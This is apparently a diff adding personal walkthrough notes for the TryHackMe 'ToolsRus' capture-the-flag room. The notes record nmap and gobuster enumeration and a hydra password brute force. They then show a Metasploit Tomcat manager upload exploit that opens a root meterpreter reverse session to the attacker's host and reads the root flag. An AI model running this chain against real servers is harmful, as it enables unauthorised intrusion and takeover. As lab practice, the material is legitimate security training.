@@ -1,0 +1,101 @@
+nmap -sSVC -Pn -vv 10.10.36.4                    
+
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 38:df:b5:47:bb:45:f2:be:ad:6a:14:e5:4d:74:bd:0c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCvGbXQ2udHlTxw/0XSfnKHv5m6DMKAEM9Hb0y8RPX3ix6ozS1OtR7T43eXf3ouq46Z7/XE5dC4uztqimjIbKss1OPmXzGln+1n2yGnn6g0FpnPij8DJ3AnqP2Krc/ZLXnzE5RQadzKwbEKecENKgMSINZ0A0cDJUpxrZoQxnKHDeNgaNRnQ2OobuOKRj6utNAkEW5qgLmo3O4bkKPNoOybDhy2/7UxEAElTd380ede37vf2kpt9hYG2nlnGQngqrbNfa7qIBxyrFyVQLinL/E5SbG85prJymvs61sGPHMKiCZRDzG4fgU2ywuVNqU/ToFxDgORlj46CN2pq10Fxo7
+|   256 a8:32:ae:2b:f0:d6:cf:e1:54:76:2a:ca:b0:e8:ec:cd (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBHptn7e/aU/cedksb1ZRt/AkQGSQl/eevKBj9+4p9dD+vRIuzzLxpsLF4EpoKFRRaD8mOihS6k777Td3NrYppQ=
+|   256 0e:51:96:ae:fb:51:af:c9:e4:ee:a6:20:a3:13:10:f7 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO7MLnGQY2zrpm27V7yNMd+NaMtr8NRns+DZB7WkcCby
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+1234/tcp open  http    syn-ack ttl 63 Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/7.0.88
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache-Coyote/1.1
+8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+gobuster dir -u http://10.10.36.4 -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.1.0
+===============================================================
+2022/01/10 06:41:20 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 294]
+/.hta                 (Status: 403) [Size: 289]
+/.htpasswd            (Status: 403) [Size: 294]
+/guidelines           (Status: 301) [Size: 313] [--> http://10.10.36.4/guidelines/]
+/index.html           (Status: 200) [Size: 168]                                    
+/protected            (Status: 401) [Size: 457]                                    
+/server-status        (Status: 403) [Size: 298]   
+
+
+hydra -l bob -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt -f 10.10.36.4 http-get /protected/
+
+[DATA] attacking http-get://10.10.36.4:80/protected/
+[80][http-get] host: 10.10.36.4   login: bob   password: bubbles
+[STATUS] attack finished for 10.10.36.4 (valid pair found)
+
+bob:bubbles
+
+
+port 1234
+
+http://10.10.36.4:1234/manager/html
+bob:bubbles
+
+5
+
+nikto -h http://10.10.36.4:1234/manager/html -id "bob:bubbles"
+
+
+
+
+- What is the server version (run the scan against port 80)?
+
+nikto -h http://10.10.36.4                                                                                 255 ⨯
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.36.4
++ Target Hostname:    10.10.36.4
++ Target Port:        80
++ Start Time:         2022-01-10 07:01:34 (GMT7)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
+
+google Apache Tomcat/Coyote JSP engine 1.1
+
+https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote
+
+https://github.com/psmiraglia/ctf/blob/master/kevgir/001-tomcat.md
+
+use exploit/multi/http/tomcat_mgr_upload
+msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost 10.11.52.16
+lhost => 10.11.52.16
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
+rport => 1234
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
+HttpUsername => bob
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
+HttpPassword => bubbles
+set rhosts 10.10.36.4
+rhosts => 10.10.36.4
+msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
+meterpreter > getuid
+Server username: root
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+cat /root/flag.txt
+ff1fc4a81affcc7688cf89ae7dc6e0e1
+
+https://tryhackme.com/room/toolsrus
